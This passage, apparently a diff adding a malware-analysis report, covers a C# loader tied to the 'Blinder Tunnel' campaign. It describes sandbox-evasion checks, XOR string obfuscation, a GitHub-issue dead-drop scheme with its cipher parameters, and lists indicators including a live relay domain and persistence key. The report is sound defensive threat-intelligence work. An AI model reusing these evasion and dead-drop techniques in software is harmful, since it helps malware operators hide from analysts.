+| CheckHardwareCharacteristics | < 2 CPUs, < 2 GB RAM, < 50 GB disk |
+| CheckParentProcess | Parent process via WMI, checks for explorer |
+| CheckAnalysisTools | 17 process names: wireshark, fiddler, procmon, procexp, ollydbg, ida, x32dbg, x64dbg, windbg, sandboxie, etc. |
+| CheckTimingAnalysis | 10M `Math.Sqrt` iterations > 2s, or 1s sleep deviating > 100ms |
+| CheckSandboxRegistryAndFiles | Registry paths for VMware/VBox, 7 driver file paths (Vmmouse.sys, vmtray.dll, vboxdisp.dll, etc.) |
+| CheckVirtualHardware | WMI `Win32_VideoController` name containing virtual, vmware, vbox |
+
+This "report everything, block nothing" approach is more sophisticated than the typical "detect sandbox, exit" pattern. By not exiting, the loader avoids giving sandbox environments a clean "no behavior observed" result. And by reporting every detail to the operator, it lets a human decide whether to deliver the payload. VT sandboxes presumably ran this sample and saw GitHub API calls, but without the actual repo contents, they could not observe second-stage behavior.
+
+## String obfuscation
+
+All user-visible strings are stored in a 5,441-byte static blob inside the `EncryptedStringTable` class. The static constructor decodes them with a position-dependent XOR:
+
+```
+decoded[i] = blob[i] ^ (i & 0xFF) ^ 0xAA
+```
+
+The blob contains 327 UTF-8 string slices, each accessed through an individual static property. We reimplemented the decryption and verified all 327 accessors decode correctly against the original blob. The full decoded table is in the accompanying [strings.tsv](strings.tsv).
+
+Because the strings are encrypted in the binary, plaintext YARA rules and string-based heuristics won't match. This is a significant factor in the 0/71 detection rate.
+
+## Comparison with Unit 42's Blinder Tunnel report
+
+Our investigation started from Unit 42's report, and the relationship is clear. The architecture, the victim-ID salt, the dead-drop regex patterns, and the AppDomainManager technique are all the same. But there are enough differences to show continued development.
+
+### What stayed the same
+
+- C# `RuntimeBroker.dll` loaded via AppDomainManager injection
+- `MicrosoftRuntime` Run key with the same persistence status strings
+- ~63-second core loop beacon interval
+- `"Peaky Blinders 2.1"` salt in victim ID computation
+- `RuntimeBrokerApi.dll` as the encrypted second stage, decrypted with AES-256-CBC where key = SHA256(license)
+- Dead-drop mechanism in GitHub issue comments using `Owner=`, `LicRepo=`, `LicToken=` regexes
+- Repository name `myLic`
+- Unicode whitespace identifiers with runtime string decryption
+
+### What changed
+
+| Aspect | Our sample | Unit 42 report |
+|---|---|---|
+| GitHub owner | `PeakyBlindersTeam` | `peakyblinders-tm` |
+| Install folder | `RuntimeBrokers` | `RuntimeBrokers` |
+| Profile/license files | `<ID>Inf.txt` = profile, `<ID>Lic.txt` = license | `Lic.txt` = fingerprint, `Inf.txt` = commands (roles reversed) |
+| Dead-drop target repo | `Microsoft/vscode` | Not specified |
+| Dead-drop cipher | AES-128-CBC, MD5 key, 5 iterations | AES-256 |
+| Persistence timer | 120 seconds initial delay | 120 seconds |
+| 403 handling | Fixed 1-hour sleep | Fixed 1-hour backoff |
+| Relay | Cloudflare Workers (`g-prx.itugegape524.workers.dev`) | Not documented |
+| Sandbox checks | 11 checks, report-only | Fewer checks |
+| Second-stage method | Looks for `InitializeNewDomain` | Looks for `Run` |
+| Shutdown exfil | `Ex.txt` upload on ProcessExit | Not documented |
+
+### Only in Unit 42's report (not in our sample)
+
+- `.csproj` build trigger and `.config` ETW disable
+- DLL sideloading step
+- PsProxy tool
+- ShelbyC2 V2, Blackwood, Chisel post-exploitation tools
+- Network-level IOCs (IPs, phishing domains)
+
+The new GitHub account and the Cloudflare Workers relay suggest the operator rotated infrastructure after the public reporting. The file-role reversal (`Inf.txt` vs `Lic.txt`) and the addition of shutdown exfiltration suggest active code-level iteration.
+
+## Indicators of Compromise
+
+### File indicators
+
+| Type | Value |
+|---|---|
+| SHA256 (loader DLL) | `AA7D4BF74EDACBA06DA7E9D414C0649599FB0E7B118F7C3DDCEC09EB3F720C82` |
+| SHA256 (parent ZIP) | `8c68119ebef2ec4be1d57f867ecc1e3606f819bd6278d35a95c6d9b789ac0bfd` |
+| File path | `%LOCALAPPDATA%\Microsoft\RuntimeBrokers\RuntimeBroker.exe` |
+| File path | `%LOCALAPPDATA%\Microsoft\RuntimeBrokers\RuntimeBrokerApi.dll` |
+
+### Network indicators
+
+| Type | Value |
+|---|---|
+| Relay domain | `g-prx.itugegape524.workers.dev` |
+| GitHub account | `PeakyBlindersTeam` |
+| GitHub repository | `PeakyBlindersTeam/myLic` |
+| Contacted IPs | `104.21.61.119`, `162.159.36.2`, `172.67.210.69` (Cloudflare) |
+
+### Host indicators
+
+| Type | Value |
+|---|---|
+| Registry value | `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MicrosoftRuntime` |
+| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0` |
+| Crash log | `crashlog.txt` in the install directory |
+
+### Dead-drop pattern
+
+```
+GET /search/issues?q=<yyyyMMdd>+repo:Microsoft/vscode+type:issue
+```
+
+Issue comments containing `<!-- [base64] -->` where the base64 decrypts (AES-128-CBC, 5 iterations, key = MD5(date + victimId), IV = MD5(key)) to text containing `Owner=`, `LicRepo=`, and `LicToken=`.
+
+
+## References
+
+- Palo Alto Unit 42, ["Unraveling the Blinder Tunnel"](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/), June 2026
+- Elastic Security Labs, ShelbyC2 reporting
+- [VirusTotal: RuntimeBroker.dll](https://www.virustotal.com/gui/file/aa7d4bf74edacba06da7e9d414c0649599fb0e7b118f7c3ddcec09eb3f720c82)
+- [VirusTotal: StarkMeet (1).zip](https://www.virustotal.com/gui/file/8c68119ebef2ec4be1d57f867ecc1e3606f819bd6278d35a95c6d9b789ac0bfd)
